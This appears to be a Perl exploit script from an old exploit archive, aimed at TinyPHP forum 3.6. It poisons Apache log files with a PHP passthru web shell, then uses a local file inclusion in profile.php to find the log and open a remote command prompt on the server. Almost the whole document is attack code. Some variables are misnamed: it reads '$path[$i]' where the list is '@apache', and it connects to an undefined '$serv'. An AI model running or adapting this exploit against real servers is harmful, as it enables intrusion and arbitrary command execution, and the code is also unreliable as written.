#!/usr/bin/perl
# $App :
# TinyPHP forum <= 3.6 Remote Command Execution Exploit
# $Bug :
# http://tiny_php/profile.php?action=view&uname=../a_file%00
# $IHST: h4ckerz.com / hackerz.ir / aria-security.net
#
#### (c)oded By Hessam-x ( Hessamx -at- Hessamx.net)

use IO::Socket;
use LWP::Simple;

print "-------------------------------------------\n";
print "=            TinyPHP forum v 3.6          =\n";
print "=       By Hessam-x  - www.hackerz.ir     =\n";
print "-------------------------------------------\n\n";

if (@ARGV < 2)
{
	print "[*] Usage: hxxpl.pl [host] [path]\n\n";
	exit();
}

    $server=$ARGV[0];
    $path=$ARGV[1];
    print " SERVER : $server \n";
    print " Path   : $path   \n";
    print "-------------------------------------------\n";

$pcode ="<?php ob_clean();echo _Hessamx_;passthru(\$_GET[cmd]);echo _xHessam_;die; ?>";
$socket = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>"$server", PeerPort=>"http(80)") || die "[-] Cannot not connect to host !\n";

 print $socket "GET ".$path.$pcode." HTTP/1.1\r\n";
 print $socket "User-Agent: ".$pcode."\r\n";
 print $socket "Host: ".$server."\r\n";
 print $socket "Connection: close\r\n\r\n";
 close($socket);

print "[+] PHP code injection in log file finished. \n";
$log = "no";
@apache=(
  "/var/log/httpd/access_log%00","/var/log/httpd/error_log%00",
  "/var/log/apache/error.log%00","/var/log/apache/access.log%00",  
  "/apache/logs/error.log%00", "/apache/logs/access.log%00",
  "/etc/httpd/logs/acces_log%00","/etc/httpd/logs/acces.log%00",
  "/etc/httpd/logs/error_log%00","/etc/httpd/logs/error.log%00",
  "/var/www/logs/access_log%00","/var/www/logs/access.log%00",
  "/usr/local/apache/logs/access_log%00","/usr/local/apache/logs/access.log%00",
  "/var/log/apache/access_log%00","/var/log/apache/access.log%00",
  "/var/log/access_log%00","/var/www/logs/error_log%00",
  "/www/logs/error.log%00","/usr/local/apache/logs/error_log%00",
  "/usr/local/apache/logs/error.log%00","/var/log/apache/error_log%00",
  "/var/log/apache/error.log%00","/var/log/access_log%00","/var/log/error_log%00",
);
for ($i=0; $i<=$#apache; $i++)
  {
 
print "[+] Apache Path : ".$i."\n";

$sock = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>$server, Timeout  => 10, PeerPort=>"http(80)") || die "[-] cannot connect to host! \n";

  print $sock "GET ".$path."profile.php?action=view&&cmd=id&uname=".$path[$i]." HTTP/1.1\r\n";
  print $sock "Host: ".$server."\r\n";
  print $sock "Connection: close\r\n\r\n";

    $out = "";
    while ($answer = <$sock>) 
    {
    $out.=$answer;
    }
    close($sock);


if ($out =~ m/_Hessamx_(.*?)_xHessam_/ms)
  {
  print "[+] Log File found ! [ $i ] \n\n";
  $log = $i;
  $i = $#path
  }
   
  }
if ($log eq "no") {
    print "[-] Can not found log file ! \n";
    print "\n[-] Exploit Failed ! ... \n";
    exit;
   }
print "[Hessam-x\@ $server] \$ ";
$cmd = <STDIN>;

while($cmd !~ "exit")
{
	$socket = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>"$serv", PeerPort=>"80") || die "[-] Cannot connect to host !\n";
	
	print $socket "GET ".$path."profile.php?cmd=".$cmd."action=view&uname=../../../../../../../../../".$path[$log]." HTTP/1.1\r\n";
	print $socket "Host: ".$serv."\r\n";
	print $socket "Accept: */*\r\n";
        print $socket "Connection: close\r\n\n";	
	
	while ($answer = <$socket>)
	{
	    print $answer;
	}
	
	print "[Hessam-x\@ $server ] \$ ";
	$cmd = <STDIN>;	
}

# milw0rm.com [2006-06-01]
